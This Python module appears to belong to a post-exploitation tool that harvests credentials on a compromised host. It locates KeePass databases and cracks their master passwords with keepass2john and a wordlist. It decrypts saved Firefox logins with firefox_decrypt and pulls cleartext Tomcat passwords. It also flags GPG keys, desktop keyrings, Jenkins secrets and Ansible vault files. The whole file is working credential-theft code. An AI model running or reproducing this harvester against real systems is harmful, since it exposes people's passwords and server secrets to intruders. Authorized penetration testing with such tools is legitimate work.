"""Application credential stores: KeePass, Firefox, GPG, keyrings, and common
server apps (Jenkins, Tomcat, Ansible). Dump what decrypts cleanly, flag what
needs an extra secret, and crack KeePass/Firefox when --crack is set."""
from __future__ import annotations

import os
import re
from typing import List

from core.secret import Secret, Status
from core.tools import (read_text, home_dirs, user_of_home, find_files,
                        which, run, exists, realpath)
from core import cracker
from .base import BaseCollector

KDBX = re.compile(r"\.kdbx?$", re.I)
FF_PROFILES = re.compile(r"^(logins\.json|key4\.db|key3\.db|signons\.sqlite)$", re.I)


class AppsCollector(BaseCollector):
    name = "Apps"
    description = "KeePass(+crack), Firefox logins, GPG, keyrings, Jenkins/Tomcat/Ansible"

    def collect(self) -> List[Secret]:
        found: List[Secret] = []
        homes = home_dirs()

        found += self._keepass(homes)
        found += self._firefox(homes)
        found += self._flags(homes)
        found += self._server_apps()
        return found

    # --- KeePass ---------------------------------------------------------
    def _keepass(self, homes) -> List[Secret]:
        out = []
        files = find_files(homes, KDBX, max_depth=8)
        for f in files:
            out.append(Secret("Apps", "", f, Status.INFO, target=f,
                              secret_type="kdbx",
                              notes="KeePass DB; crack master: keepass2john -> john"))
        if self.crack_enabled and files and which("keepass2john"):
            self.status("cracking keepass")
            lines = []
            for f in files:
                r = run(["keepass2john", realpath(f)], timeout=30)
                for ln in r.output.splitlines():
                    if ln.strip() and ":" in ln and "$keepass$" in ln:
                        lines.append(ln.strip())
            for ident, pw in cracker.crack(lines, self.wordlist, label="keepass",
                                           progress_cb=self.progress_cb()).items():
                out.append(Secret("Apps", "", pw, Status.CRACKED,
                                  secret_type="kdbx-master", target=ident,
                                  notes="cracked KeePass master pw"))
        return out

    # --- Firefox ---------------------------------------------------------
    def _firefox(self, homes) -> List[Secret]:
        out = []
        profile_dirs = set()
        for h in homes:
            for base in (".mozilla/firefox", ".thunderbird",
                         ".var/app/org.mozilla.firefox/.mozilla/firefox"):
                for f in find_files([os.path.join(h, base)], FF_PROFILES, max_depth=3):
                    profile_dirs.add(os.path.dirname(f))
        ff = which("firefox_decrypt") or which("firefox_decrypt.py")
        for prof in sorted(profile_dirs):
            if ff and self.crack_enabled:
                # firefox_decrypt prints User/Password; empty master pw auto-works
                r = run([ff, "-n", realpath(prof)], timeout=60)
                out += self._parse_ffdecrypt(r.output, prof)
            else:
                out.append(Secret("Apps", "", prof, Status.INFO, target=prof,
                                  secret_type="firefox-profile",
                                  notes="Firefox creds; decrypt: firefox_decrypt (run with --crack)"))
        return out

    def _parse_ffdecrypt(self, out: str, prof: str) -> List[Secret]:
        res = []
        user = url = None
        for line in out.splitlines():
            line = line.strip()
            lo = line.lower()
            if lo.startswith("website:") or lo.startswith("url:"):
                url = line.split(":", 1)[1].strip()
            elif lo.startswith("username:") or lo.startswith("user:"):
                user = line.split(":", 1)[1].strip()
            elif lo.startswith("password:"):
                pw = line.split(":", 1)[1].strip()
                res.append(Secret("Apps", user or "", pw, Status.DECRYPTED,
                                  target=url or prof, secret_type="firefox-login",
                                  notes="Firefox saved login"))
                user = url = None
        if not res:
            res.append(Secret("Apps", "", prof, Status.INFO, target=prof,
                              secret_type="firefox-profile",
                              notes="Firefox profile (no plaintext extracted / master pw set)"))
        return res

    # --- flag-only stores ------------------------------------------------
    def _flags(self, homes) -> List[Secret]:
        out = []
        for h in homes:
            user = user_of_home(h)
            for rel, typ, note in (
                (".gnupg", "gpg", "GPG keyring/secret keys"),
                (".local/share/keyrings", "gnome-keyring", "needs login pw to decrypt"),
                (".kde/share/apps/kwallet", "kwallet", "KWallet - needs login pw"),
                (".local/share/kwalletd", "kwallet", "KWallet - needs login pw"),
                (".password-store", "pass", "pass(1) store - GPG-encrypted"),
            ):
                p = os.path.join(h, rel)
                if exists(p):
                    out.append(Secret("Apps", user, p, Status.INFO, target=p,
                                      secret_type=typ, notes=note))
        return out

    # --- server apps (root-readable config stores) -----------------------
    def _server_apps(self) -> List[Secret]:
        out = []
        # Jenkins: credentials.xml (encrypted with master.key+hudson.util.Secret)
        for f in find_files(["/var/lib/jenkins", "/var/jenkins_home", "/opt"],
                            re.compile(r"^(credentials\.xml|master\.key|hudson\.util\.Secret)$"),
                            max_depth=4):
            out.append(Secret("Apps", "", f, Status.INFO, target=f,
                              secret_type="jenkins",
                              notes="Jenkins secret; decrypt needs master.key+hudson.util.Secret"))
        # Tomcat users
        for f in find_files(["/etc/tomcat*", "/opt", "/usr/share/tomcat*", "/var/lib/tomcat*"],
                            re.compile(r"^tomcat-users\.xml$"), max_depth=5):
            txt = read_text(f)
            if txt:
                for m in re.finditer(r'password="([^"]+)".*?username="([^"]+)"|username="([^"]+)".*?password="([^"]+)"', txt):
                    user = m.group(2) or m.group(3) or ""
                    pw = m.group(1) or m.group(4) or ""
                    out.append(Secret("Apps", user, pw, Status.CLEARTEXT, target=f,
                                      secret_type="password", notes="Tomcat user"))
        # Ansible vault + vault password files
        for f in find_files(["/etc/ansible", "/opt", "/home", "/root"],
                            re.compile(r"(vault[_-]?pass.*|\.vault_pass|.*\.vault)$", re.I),
                            max_depth=5):
            out.append(Secret("Apps", "", f, Status.INFO, target=f,
                              secret_type="ansible",
                              notes="Ansible vault/password file"))
        return out
